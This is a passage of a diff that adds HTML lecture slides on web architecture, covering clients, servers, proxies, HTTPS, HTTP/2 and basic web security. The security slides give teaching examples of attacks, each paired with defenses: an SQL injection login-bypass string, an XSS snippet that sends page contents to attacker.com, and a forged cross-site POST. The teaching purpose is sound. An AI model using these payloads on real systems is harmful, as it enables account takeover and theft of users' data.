+          <li><a href="http://www.opera.com/">Opera</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#http-scripting">applications</a>
+        <ul class="inline">
+          <li><a href="#http-scripting">Web applications</a></li>
+          <li><a href="#desktop-mobile-applications">(native) desktop &amp; mobile applications</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#crawlers">crawlers</a>
+      </li>
+      <li>
+        embedded devices and sensors
+        <ul>
+          <li><em>Web of Things</em></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="client-core">
+    <h2>
+      All clients need to support<br>
+      a couple of core technologies.
+    </h2>
+    <ul>
+      <li>
+        networking technologies
+        <ul class="inline">
+          <li>TCP/IP</li>
+          <li>DNS</li>
+        </ul>
+      </li>
+      <li>
+        the HTTP protocol
+        <ul>
+          <li>many libraries exist</li>
+          <li>often combined with networking support</li>
+        </ul>
+      </li>
+      <li>
+        one or more representation formats
+        <ul>
+          <li>not necessarily (only) HTML</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="browsers">
+    <h2>
+      Browsers offer an interactive environment<br>
+      for general-purpose website consumption.
+    </h2>
+    <ul>
+      <li class="next">They render HTML elements as interactive controls.</li>
+      <li class="next">They typically support styles, media, and scripts.</li>
+      <li class="next">Standards ensure consistency <em>(mostly)</em>.</li>
+      <li class="next">
+        The main differences are features and preferences.
+        <ul>
+          <li>operating system</li>
+          <li>performance</li>
+          <li>extensions</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="http-scripting">
+    <h2>
+      Web applications perform HTTP requests<br>
+      using browser scripting functionality.
+    </h2>
+    <ul>
+      <li class="next">
+        A script on a webpage can make HTTP requests.
+      </li>
+      <li class="next">
+        The server typically returns <a href="#json">JSON</a> or <a href="#xml">XML</a> responses,<br>
+        which the script then transforms.
+        <ul>
+          <li>
+            Alternatively, the server could return <a href="#html5">HTML</a>,<br>
+            for instance, to update parts of the page.
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        Scripts can be triggered automatically<br>
+        or through user actions.
+        <ul class="inline">
+          <li>clicking a button or link</li>
+          <li>pressing a key <em>(autocompletion)</em></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="desktop-mobile-applications">
+    <h2>
+      Desktop and mobile applications<br>
+      can similarly create HTTP requests.
+    </h2>
+    <ul>
+      <li class="next">
+        They use their own infrastructure,<br>
+        as they don’t have the browser’s.
+        <ul>
+          <li class="next">In particular, they usually don’t set cookies.</li>
+        </ul>
+      </li>
+      <li class="next">
+        They typically request <a href="#json">JSON</a> (or <a href="#xml">XML</a>),<br>
+        but <a href="#html5">HTML</a> is not uncommon.
+        <ul class="next">
+          <li>HTML can be used to render partial views.</li>
+          <li class="opinion">Is there a real need then for a native app?</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="crawlers">
+    <h2>
+      Crawlers process and/or index webpages,<br>
+      and follow links to others.
+    </h2>
+    <ul>
+      <li class="next">
+        Crawlers extract, process, and index text contents.
+      </li>
+      <li class="next">
+        They also analyze (some) structured annotations.
+        <ul>
+          <li>
+            to improve search results
+            (<a href="https://developers.google.com/structured-data/rich-snippets/">Google’s Rich Snippets</a>)
+          </li>
+          <li>
+            for social interactions
+            (<a href="https://developers.facebook.com/docs/sharing/best-practices#crawl">Facebook’s Open Graph</a>)
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        Using links, they discover other pages.
+        <ul>
+          <li>Content behind forms etc. is called the <a href="http://dx.doi.org/10.3998/3336451.0007.104">deep Web</a>.</li>
+          <li>Crawlers are <a href="https://googlewebmastercentral.blogspot.be/2008/04/crawling-through-html-forms.html">making</a>
+              <a href="https://googlewebmastercentral.blogspot.be/2011/11/get-post-and-safely-surfacing-more-of.html">progress</a>
+              in using forms.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="toc slide" id="servers">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li class="current">
+        <a href="#architecture">Web Architecture</a>
+        <ul>
+          <li><a href="#architecture">Clients</a></li>
+          <li class="current"><a href="#servers">Servers</a></li>
+          <li><a href="#intermediaries">Intermediaries</a></li>
+        </ul>
+      </li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="opaque-urls">
+    <h2>
+      The HTTP protocol does <em>not</em> attach<br>
+      meaning to URL paths and query strings.
+    </h2>
+    <p class="next">
+      Even though <em>you</em> might attach meaning to an URL like<br>
+      <em>http://example.org/products/guitars.html?brand=gibson</em>,<br>
+      such an interpretation is not specified.
+    </p>
+    <p class="next">
+      In particular, slashes do not necessarily indicate folders;<br>
+      a dot does not necessarily signal an extension.
+    </p>
+    <p class="next">
+      The server might just have used this URL instead:<br>
+      <em>http://example.org/products-guitars?html%2Fbrand.gibson</em><br>
+      and it might very well point to an image.
+    </p>
+  </div>
+
+  <div class="slide" id="web-server-types">
+    <h2>
+      Web servers exist in many kinds and<br>
+      have many possible implementations.
+    </h2>
+    <ul>
+      <li>
+        <a href="#file-server">file servers</a>
+        <ul>
+          <li>for static files</li>
+        </ul>
+      </li>
+      <li>
+        <a href="#application-server">application servers</a>
+        <ul>
+          <li>for interactive sites</li>
+          <li>for editable content (Content Management Systems)</li>
+        </ul>
+      </li>
+      <li>
+        <a href="#proxies">proxies</a>
+        <ul>
+          <li>delegate requests to other Web servers</li>
+        </ul>
+      </li>
+    </ul>
+    <footer>
+      <p>Some servers can combine different roles.</p>
+    </footer>
+  </div>
+
+  <div class="slide" id="file-server">
+    <h2>
+      A static file server maps HTTP URLs<br>
+      to internal file URLs.
+    </h2>
+    <ul>
+      <li>
+        A config file usually assigns a <em>root folder</em> per domain.
+        <ul>
+          <li>
+            <em>http://example.org/images/products/guitar.jpg</em>
+            could map to <em>/var/www/example.org/images/products/guitar.jpg</em>
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        Folders map to possible <em>index</em> files.
+        <ul>
+          <li>
+            <em>http://example.org/images/products/</em>
+            could map to <em>/var/www/example.org/images/products/index.html</em>
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        Custom permissions and rules can be set.
+        <ul class="inline">
+          <li>
+            <a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#location"><code>location</code></a> for
+            <a href="http://nginx.org/">NGINX</a>
+          </li>
+          <li>
+            <a href="https://httpd.apache.org/docs/2.4/howto/htaccess.html">.htaccess</a> for
+            <a href="http://httpd.apache.org/">Apache</a>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="application-server">
+    <h2>
+      An application server uses server-side code<br>
+      to generate pages on demand.
+    </h2>
+    <ul>
+      <li>
+        The request is parsed by an application framework,<br>
+        which exposes the URL, method, and headers.
+      </li>
+      <li class="next">
+        Implementors can react to specific URLs or patterns,
+        typically generating responses using templates.
+      </li>
+      <li class="next">
+        Many languages and frameworks exist.
+        <ul>
+          <li>
+            languages:
+            <ul class="inline">
+              <li>Java</li>
+              <li><a href="#php">PHP</a></li>
+              <li><a href="#javascript">JavaScript</a></li>
+              <li>Ruby</li>
+              <li>C#</li>
+              <li>…</li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>
+            frameworks:
+            <ul class="inline">
+              <li>Spring MVC</li>
+              <li><a href="#ruby-on-rails">Ruby on Rails</a></li>
+              <li><a href="#aspnet">ASP.NET</a></li>
+              <li>…</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="toc slide" id="intermediaries">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li class="current">
+        <a href="#architecture">Web Architecture</a>
+        <ul>
+          <li><a href="#architecture">Clients</a></li>
+          <li><a href="#servers">Servers</a></li>
+          <li class="current"><a href="#intermediaries">Intermediaries</a></li>
+        </ul>
+      </li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="multiple-intermediaries">
+    <h2>
+      Several intermediaries may exist<br>
+      between a client and a server.
+    </h2>
+    <iframe class="image" src="images/intermediaries.svg"></iframe>
+  </div>
+
+  <div class="slide" id="transparency">
+    <h2>
+      In contrast to many other protocols,<br>
+      HTTP enables transparent intermediaries.
+    </h2>
+    <p class="next">
+      This is not as easy with other protocols.<br>
+      For example, let’s assume Java RMI.
+    </p>
+    <pre class="next"><code>removeObject.getMessage(234);
+removeObject.getMessage(234);
+removeObject.deleteMessage(234);</code></pre>
+    <p class="next">
+      If a <a href="#proxies">proxy server</a> is inserted before the remote server,<br>
+      may it cache the result of <code>getMessage</code>?
+      If so, how long?
+    </p>
+  </div>
+
+  <div class="slide" id="http-transparency">
+    <h2>
+      HTTP can be transparent because of<br>
+      its standardized uniform interface.
+    </h2>
+    <ul>
+      <li class="next">
+        <a href="https://tools.ietf.org/html/rfc7234">Caching</a>
+        is possible with headers<br>such as
+        <a href="https://tools.ietf.org/html/rfc7234#section-5.2"><code>Cache-Control</code></a>
+        and
+        <a href="https://tools.ietf.org/html/rfc7232#section-2.3"><code>ETag</code></a>.
+        <ul>
+          <li><code>Cache-Control: max-age=3600</code></li>
+          <li><code>ETag: UniqueHash456</code></li>
+        </ul>
+      </li>
+      <li class="next">
+        The intermediary fetches the requested item<br>
+        and keeps it in cache until it expires.
+      </li>
+      <li class="next">
+        Repeated requests for the item<br>
+        are served from cache.
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="methods-caching">
+    <h2>
+      The standardized method semantics<br>
+      are crucial to make caching work.
+    </h2>
+    <ul>
+      <li class="next">
+        Repeated <code>GET</code> requests can be cached,<br>
+        because <code>GET</code> is safe.
+        <ul>
+          <li>
+            The client did not ask for changes,<br>
+            so the server should perform none.
+          </li>
+          <li>
+            Since nothing changes, we can bypass the server.
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        If <code>POST</code> or <code>PUT</code> are used on a resource,<br>
+        a subsequent <code>GET</code> must not be read from cache.
+        <ul>
+          <li><code>POST</code> or <code>PUT</code> are not safe and may change things.</li>
+          <li>(Repeated identical <code>PUT</code> requests can be ignored though.)</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="intermediary-roles">
+    <h2>
+      Intermediaries can play different roles<br>
+      in an HTTP interaction.
+    </h2>
+    <dl>
+      <dt>caching</dt>
+      <dd>to improve performance and availability</dd>
+      <dt>security</dt>
+      <dd>to handle authorization and authentication</dd>
+      <dt>routing</dt>
+      <dd>to redirect toward the right server</dd>
+      <dt>load balancing</dt>
+      <dd>to distribute load over servers</dd>
+      <dt>anonymizing</dt>
+      <dd>to bypass identification or logging</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="proxies">
+    <h2>
+      Depending on their position the network,<br>
+      proxies are <em>forward</em> or <em>reverse</em>.
+    </h2>
+    <ul>
+      <li>
+        (forward) proxy
+        <ul class="next">
+          <li>in the network of the client</li>
+          <li>typically used for caching</li>
+          <li>possibly for security/anonymity purposes</li>
+        </ul>
+      </li>
+      <li>
+        reverse proxy
+        <ul class="next">
+          <li>in the network of the server</li>
+          <li>typically used for caching</li>
+          <li>also for routing, hiding/abstracting remote architecture</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="reverse-proxy">
+    <h2>
+      A device can listen on only one TCP port 80.<br>
+      A reverse proxy lets it run many servers.
+    </h2>
+    <ul>
+      <li>
+        What if we need to serve static <em>and</em> dynamic files?<br>
+        What if we want to combine application servers?
+        <ul>
+          <li>
+            Only one application can listen to a given TCP port.
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        Configure servers to run on internal ports<br>
+        (such as 3000, 4000, 5000) instead of port 80.
+      </li>
+      <li class="next">
+        Run a reverse proxy
+        <em>(<a href="http://nginx.org/">NGINX</a>,
+             <a href="http://httpd.apache.org/">Apache</a>,
+             …)</em>
+        on port 80,<br>
+        which dispatches requests to the other servers.
+        <ul>
+          <li>Route requests based on <code>Host</code> header and/or path.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="reverse-proxy-diagram">
+    <h2>
+      The proxy interfaces with app servers<br>
+      through other, non-public TCP ports.
+    </h2>
+    <iframe class="image" src="images/reverse-proxy.svg"></iframe>
+  </div>
+
+  <div class="slide" id="caching-anywhere">
+    <h2>
+      Caching can happen virtually anywhere—<br>
+      and we don’t always know.
+    </h2>
+    <iframe class="image" src="images/intermediaries.svg"></iframe>
+  </div>
+
+  <div class="slide" id="client-server-relative">
+    <h2>
+      The notion of “client” and “server”<br>
+      is relative to the interaction.
+    </h2>
+    <iframe class="image" src="images/client-server.svg"></iframe>
+  </div>
+
+  <div class="toc slide" id="beyond-the-core">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li class="current">
+        <a href="#beyond-the-core">Beyond the Core</a>
+        <ul>
+          <li class="current"><a href="#beyond-the-core">HTTPS</a></li>
+          <li><a href="#http2">HTTP/2</a></li>
+          <li><a href="#security">Security</a></li>
+        </ul>
+      </li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="http-insecure">
+    <h2>
+      HTTP nodes send plaintext over TCP,<br>
+      which means intermediaries can read it.
+    </h2>
+    <ul>
+      <li class="next">The privacy of your <em>requests</em> is not guaranteed.</li>
+      <li class="next">The privacy of server <em>responses</em> is not guaranteed.</li>
+      <li class="next">The <em>integrity</em> of server responses is not guaranteed.</li>
+    </ul>
+  </div>
+
+  <div class="slide" id="http-threats">
+    <h2>
+      The Web needs to be a safe<br>
+      and trusted environment for all.
+    </h2>
+    <ul>
+      <li>
+        HTTP poses a major threat
+        for sensitive applications.
+        <ul class="inline">
+          <li>banking</li>
+          <li>payment</li>
+          <li>medical records</li>
+          <li>webmail</li>
+          <li>…</li>
+        </ul>
+      </li>
+      <li class="next">
+        It’s hard to define what is <em>sensitive</em>.
+        <ul>
+          <li class="next">Can others see what Wikipedia articles you read?</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https">
+    <h2>
+      <a href="https://tools.ietf.org/html/rfc2818">HTTPS</a> is a secure extension<br>
+      of the HTTP protocol.
+    </h2>
+    <ul>
+      <li>
+        <a href="https://tools.ietf.org/html/rfc2818#section-2">Simply use HTTP over TLS</a> precisely<br>
+        as you would use HTTP over TCP.
+      </li>
+      <li class="next">
+        <a href="https://tools.ietf.org/html/rfc2246">Transport Layer Security (TLS)</a>
+        is a cryptographic protocol for Internet communication.
+        <ul>
+          <li>TLS succeeded <a href="https://tools.ietf.org/html/rfc6101">Secure Sockets Layer (SSL)</a>.</li>
+          <li>TLS is still frequently referred to as “SSL”.</li>
+        </ul>
+      </li>
+      <li class="next">
+        TLS relies on asymmetric encryption.
+        <ul>
+          <li>private and public keys</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https-where">
+    <h2>
+      HTTPS can be applied in<br>
+      different parts of the network.
+    </h2>
+    <p>
+      Consider the common use case in which<br>
+      an <strong>application server</strong> lives behind a <strong>reverse proxy</strong>.
+    </p>
+    <ul>
+      <li class="next">
+        Only the proxy could use HTTPS.
+        <ul>
+          <li>Typically, server and proxy operate in a trusted network.</li>
+          <li>Client–proxy communications are secured.</li>
+        </ul>
+      </li>
+      <li class="next">
+        The server <em>and</em> the proxy could use HTTPS.
+        <ul>
+          <li>These are two <em>different</em> encrypted communications.</li>
+          <li>No proxy can sit “in between” an encrypted communication.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https-how">
+    <h2>
+      Setting up HTTPS involves requesting,<br>
+      installing, and maintaining a certificate.
+    </h2>
+    <ul>
+      <li class="next">
+        Request SSL certificate from a <em>certificate authority</em>.
+        <ul>
+          <li>This certificate is valid for one or more hostnames.</li>
+          <li><a href="https://letsencrypt.org/">Let's Encrypt</a> provides free certificates for all.</li>
+        </ul>
+      </li>
+      <li class="next">
+        Configure your Web server with the certificate.
+        <ul>
+          <li>private key stored safely</li>
+          <li>public key shared with clients</li>
+        </ul>
+      </li>
+      <li class="next">
+        When the certificate expires, request a new one.
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https-urls">
+    <h2>
+      HTTPS URLs are different,<br>
+      so clients know what protocol to use.
+    </h2>
+    <ul>
+      <li>
+        HTTP URLs start with <code>http:</code><br>
+        HTTPS URLs start with <code>https:</code>
+      </li>
+      <li class="next">
+        After HTTPS has been configured,<br>
+        server admins typically set up redirects.
+        <ul>
+          <li>Never break existing URLs!</li>
+        </ul>
+      </li>
+      <li class="next">
+        The connection between two URLS differing only
+        in <code>http</code>/<code>https</code> is <em>not</em> universally defined.
+        <ul>
+          <li>They <em>could</em> be different things.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https-ui">
+    <h2>
+      <a href="https://noncombatant.org/2017/02/15/decoding-chromes-https-ux/">Informing users about security in the UI</a><br>
+      is an important part of a safer Web.
+    </h2>
+    <p>
+      Most browsers indicate HTTPS in the address bar.
+    </p>
+    <img src="images/https-secure.png" class="center" alt="[“Secure” indication in the address bar]">
+  </div>
+
+  <div class="slide" id="https-default">
+    <h2>
+      Some browsers such as Chrome<br>
+      <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">campaign</a> for an all-HTTPS Web.
+    </h2>
+    <img src="images/chrome-http.png" alt="[current treatment of regular HTTP pages in Chrome]">
+    <img src="images/chrome-http-future.png" class="next" alt="[future treatment of regular HTTP pages in Chrome]">
+  </div>
+
+  <div class="toc slide" id="http2">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li class="current">
+        <a href="#beyond-the-core">Beyond the Core</a>
+        <ul>
+          <li><a href="#beyond-the-core">HTTPS</a></li>
+          <li class="current"><a href="#http2">HTTP/2</a></li>
+          <li><a href="#security">Security</a></li>
+        </ul>
+      </li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="http2-necessity">
+    <h2>
+      The Web has been pushing HTTP’s limits,<br>
+      so an update was due.
+    </h2>
+    <ul>
+      <li class="next">
+        The Web has <a href="#webpage-size">different demands</a> nowadays<br>
+        than those initially envisaged.
+      </li>
+      <li class="next">
+        HTTP/2 is an update of the HTTP protocol<br>
+        that addresses a couple of key bottlenecks.
+      </li>
+    </ul>
+    <p>
+      This section is based on <a href="https://http2-explained.haxx.se/content/en/"><em>http2 explained</em></a><br>
+      by <a href="https://daniel.haxx.se/">Daniel Stenberg</a>,
+      creator of <a href="https://curl.haxx.se/">curl</a>.
+    </p>
+  </div>
+
+  <div class="slide" id="webpage-size">
+    <h2>
+      Webpages consist of more and more items<br>
+      that increasingly become larger.
+    </h2>
+    <ul>
+      <li class="next">
+        The <a href="http://httparchive.org/">HTTP Archive</a>
+        saw average total page transfer size increase
+        from 0.7Mb in 2010 to 2.35Mb in 2017.
+      </li>
+      <li class="next">
+        The average page consist of more than 90 objects.
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="http-limitations">
+    <h2>
+      Several limitations of HTTP have<br>
+      a negative impact on page load times.
+    </h2>
+    <ul>
+      <li class="next">
+        <a href="https://http2-explained.haxx.se/content/en/part2.html#23-inadequate-use-of-tcp">TCP connections are not used optimally.</a>
+        <ul>
+          <li>Connections are costly due to the three-way handshake.</li>
+          <li>Limit the connections per host to avoid exhaustion.</li>
+        </ul>
+      </li>
+      <li class="next">
+        <a href="https://http2-explained.haxx.se/content/en/part2.html#25-latency-kills">HTTP is very latency-sensitive.</a>
+      </li>
+      <li class="next">
+        <a href="https://http2-explained.haxx.se/content/en/part2.html#26-head-of-line-blocking">Sequential handling of requests blocks pipelines.</a>
+        <ul>
+          <li>
+            <em>HTTP pipelining</em> allows issuing multiple requests on a single TCP connection
+            without waiting for responses to arrive.
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="http-workarounds">
+    <h2>
+      Many websites use(d) workarounds<br>
+      to circumvent HTTP’s limitations.
+    </h2>
+    <dl>
+      <dt><a href="https://http2-explained.haxx.se/content/en/part3.html#32-inlining">inlining</a></dt>
+      <dd class="next">
+        Embed scripts, images, and/or styles
+        inside HTML documents instead of linking them
+        to reduce the number of items.
+      </dd>
+      <dt><a href="https://http2-explained.haxx.se/content/en/part3.html#33-concatenation">concatenation</a></dt>
+      <dd class="next">
+        Combine several scripts, images, or styles
+        into a single file.
+      </dd>
+      <dt><a href="https://http2-explained.haxx.se/content/en/part3.html#34-sharding">sharding</a></dt>
+      <dd class="next">
+        Distribute resources across different domains
+        to bypass connection restrictions.
+      <dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="http2-goals">
+    <h2>
+      HTTP/2 set out a couple of<br>
+      important <a href="https://http2-explained.haxx.se/content/en/part4.html">goals</a> for improvement.
+    </h2>
+    <ul>
+      <li>Reduce sensitivity to latency.</li>
+      <li>Eliminate the need for multiple connections.</li>
+      <li>Fix HTTP pipelining and line blocking.</li>
+      <li>Maintain interfaces, content, and URLs.</li>
+      <li>Be backward compatible for HTTP 1.1 clients.</li>
+    </ul>
+  </div>
+
+  <div class="slide" id="http2-protocol">
+    <h2>
+      HTTP/2 is a binary protocol that sends<br>
+      frames over multiplexed streams.
+    </h2>
+    <ul>
+      <li class="next">
+        Switching to <a href="https://http2-explained.haxx.se/content/en/part6.html#61-binary">binary</a> makes framing easier.
+        <ul>
+          <li>10 types of frames</li>
+          <li><code>HEADERS</code> frame for HTTP headers</li>
+          <li><code>DATA</code> for request and response payloads</li>
+        </ul>
+      </li>
+      <li class="next">
+        <a href="https://http2-explained.haxx.se/content/en/part6.html#63-multiplexed-streams">Multiplexing</a> ensures objects don’t block each other.
+        <ul>
+          <li>Frames from many streams flow over the same connection.</li>
+        </ul>
+      </li>
+      <li class="next">
+        <a href="https://http2-explained.haxx.se/content/en/part6.html#65-header-compression">Additional compression</a> reduces overhead.
+        <ul>
+          <li>HTTP’s stateless nature implies repetition.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="http2-tls">
+    <h2>
+      HTTP/2 always goes over TLS in practice,<br>
+      even though the standard also allows TCP.<br>
+    </h2>
+    <ul>
+      <li class="next">
+        With regular TCP on port 80, clients would<br>
+        need to upgrade from HTTP 1.x to HTTP/2.
+        <ul>
+          <li>overhead necessary for backward compatibility</li>
+        </ul>
+      </li>
+      <li class="next">
+        With TLS, <a href="https://tools.ietf.org/html/rfc7301">Application-Layer Protocol Negotiation</a>
+        is embedded within the TLS handshake.
+        <ul>
+          <li>no protocol selection latency</li>
+        </ul>
+      </li>
+      <li class="next">
+        Firefox and Chrome will only support TLS.
+        <ul>
+          <li><code>https:</code> everywhere in the future</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="toc slide" id="security">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li class="current">
+        <a href="#beyond-the-core">Beyond the Core</a>
+        <ul>
+          <li><a href="#beyond-the-core">HTTPS</a></li>
+          <li><a href="#http2">HTTP/2</a></li>
+          <li class="current"><a href="#security">Security</a></li>
+        </ul>
+      </li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="application-security">
+    <h2>
+      Protocol-level security is insufficient<br>
+      to provide application-level security.
+    </h2>
+    <ul>
+      <li class="next">
+        Protocol-level security only guarantees privacy and integrity
+        from one endpoint to another.
+      </li>
+      <li class="next">
+        The Web evolved from a document system
+        to a distributed application platform.
+      </li>
+      <li class="next">
+        Applications themselves also need<br>
+        mechanisms to secure information.
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="attacks">
+    <h2>
+      We will examine 3 common attack types<br>
+      and how to defend against them.
+    </h2>
+    <dl>
+      <dt><a href="#code-injection">code injection</a></dt>
+      <dd>executing malicious scripts on the server</dd>
+      <dt><a href="#xss">cross-site scripting</a></dt>
+      <dd>executing malicious scripts on the client</dd>
+      <dt><a href="#cross-origin-access">cross-origin access</a></dt>
+      <dd>accessing information from other websites</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="code-injection">
+    <h2>
+      With code injection, clients send input<br>
+      designed to execute on the server.
+    </h2>
+    <dl>
+      <dt>attack</dt>
+      <dd class="next">executable code passed in an URL or <code>POST</code> body parameter</dd>
+      <dt>cause</dt>
+      <dd class="next">improper input validation by the server</dd>
+      <dt>defense</dt>
+      <dd class="next"><em>never</em> trust raw client input</dd>
+      <dd class="next">validate input ranges</dd>
+      <dd class="next">escape values before passing to scripts</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="sql-injection">
+    <h2>
+      SQL injection used to be<br>
+      a very common type of attack.
+    </h2>
+    <h3>Server-side code</h3>
+    <pre><code>query = "SELECT id FROM User WHERE name='" + name + "' +
+        " AND password='" + password + "'";</code></pre>
+    <h3>Client-side code</h3>
+    <p class="next">
+      <label>username</label>
+      <input class="small" value="admin">
+      <label>password</label>
+      <input class="small" value="' OR ''='">
+    </p>
+    <h3>Result</h3>
+    <pre class="next"><code>SELECT id FROM User <strong>WHERE name='admin'</strong>
+                    <strong>AND</strong> password='' OR <strong>''=''</strong>;</code></pre>
+  </div>
+
+  <div class="slide" id="server-side-validation">
+    <h2>
+      Client-side validation <em>only</em> offers usability;<br>
+      servers <em>always</em> need to (re-)validate.
+    </h2>
+    <h3>Client-side form</h3>
+    <p>
+      <label>role</label>
+      <select name="role">
+        <option value="1" disabled>admin</option>
+        <option value="2">user</option>
+        <option value="3">developer</option>
+      </select>
+    </p>
+    <h3>Ways to bypass</h3>
+    <ul>
+      <li class="next">change the HTML at runtime</li>
+      <li class="next">construct the HTTP request in another way</li>
+    </ul>
+  </div>
+
+  <div class="slide" id="client-only-validation">
+    <figure class="cover width">
+      <img src="images/client-only-validation.jpg" alt="" />
+      <figcaption>Client-side-only validation in the real world</figcaption>
+    </figure>
+  </div>
+
+  <div class="slide" id="xss">
+    <h2>
+      With Cross-Site Scripting (XSS), a <em>client-side</em> script
+      steals information from a webpage.
+    </h2>
+    <dl>
+      <dt>attack</dt>
+      <dd class="next">trick another site into executing code in its own space,
+                       exposing or changing user data</dd>
+      <dt>causes</dt>
+      <dd class="next">improper input validation</dd>
+      <dd class="next">trusting third-party content</dd>
+      <dd class="next">social engineering</dd>
+      <dt>defense</dt>
+      <dd class="next">validate input</dd>
+      <dd class="next">add token field on forms</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="xss-injection">
+    <h2>
+      Injecting JavaScript in pages<br>
+      can steal a user’s personal data.
+    </h2>
+    <h3>Original page echoes <code>assets</code> in contents</h3>
+    <pre><code>https://mybank.com/onlinebanking/?search=assets</code></pre>
+    <h3>Attack code</h3>
+    <pre class="next"><code>(xhr = new XMLHttpRequest()).open('GET',
+  'http://attacker.com/?data=' + document.body.innerHTML);
+xhr.send(null);</code></pre>
+    <h3>Modified URL echoes the attack code in contents</h3>
+    <pre class="next"><code>https://mybank.com/onlinebanking/?search=<ins>%3Cscript%3E(xhr%20%3D%20new</ins></code></pre>
+  </div>
+
+  <div class="slide" id="xss-form">
+    <h2>
+      Submitting a form to another site<br>
+      can execute actions on a user's behalf.
+    </h2>
+    <h3>Attack code placed on third-party website</h3>
+    <pre class="next"><code>(xhr = new XMLHttpRequest()).open('POST',
+  'http://reddit.com/?message=Cheap%20Pills%20For%20Sale');
+xhr.send(null);</code></pre>
+    <h3 class="next">Cross-Site Request Forgery (CSRF) Prevention</h3>
+    <pre class="next"><code>&lt;input name="csrf" type=&quot;hidden&quot; value=&quot;XVduuls7&quot; /&gt;
+&lt;input name="message" type=&quot;text&quot;/&gt;</code></pre>
+  </div>
+
+  <div class="slide" id="cross-origin-access">
+    <h2>
+      With cross-origin access, a page requests
+      third-party resources through JavaScript.
+    </h2>
+    <dl>
+      <dt>attack</dt>
+      <dd class="next">request resources from another site with JavaScript and read their contents</dd>
+      <dt>causes</dt>
+      <dd class="next">the existence of <code>XMLHttpRequest</code></dd>
+      <dd class="next">being logged in on another website</dd>
+      <dt>defense</dt>
+      <dd class="next">browsers block cross-origin requests by default</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="cross-origin-why">
+    <h2>
+      Cross-origin requests are a problem<br>
+      within browsers only.
+    </h2>
+    <ul>
+      <li>
+        Nothing happens when any other script or app<br>
+        requests <code>https://mybank.com/onlinebanking/</code>.
+        <ul class="next">
